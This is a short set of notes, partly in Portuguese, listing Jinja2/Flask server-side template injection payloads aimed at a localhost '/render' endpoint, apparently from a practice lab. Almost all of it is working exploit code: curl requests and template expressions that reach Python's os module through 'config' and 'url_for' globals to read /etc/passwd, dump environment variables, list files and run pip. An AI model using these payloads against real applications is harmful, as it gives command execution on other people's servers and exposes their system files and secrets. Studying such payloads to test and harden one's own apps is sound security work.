```bash
curl -X POST -d "input={{21*2}}" http://localhost:5000/render
curl -X POST -d "input={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}" http://localhost:5000/render
```

ou direto no site:
{{21*2}}

```py
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
{{ url_for.__globals__['os'].popen('cat /etc/passwd').read() }}

{{ url_for.__globals__['os'].popen('env').read() }}

{{ url_for.__globals__['os'].popen('ls').read() }}
{{ url_for.__globals__['os'].popen('cat requirements.txt').read() }}
{{ url_for.__globals__['os'].system('pip install pandas') }}
{{ url_for.__globals__['os'].system('pip freeze > requirements.txt') }}
{{ url_for.__globals__['os'].popen('cat requirements.txt').read() }}
```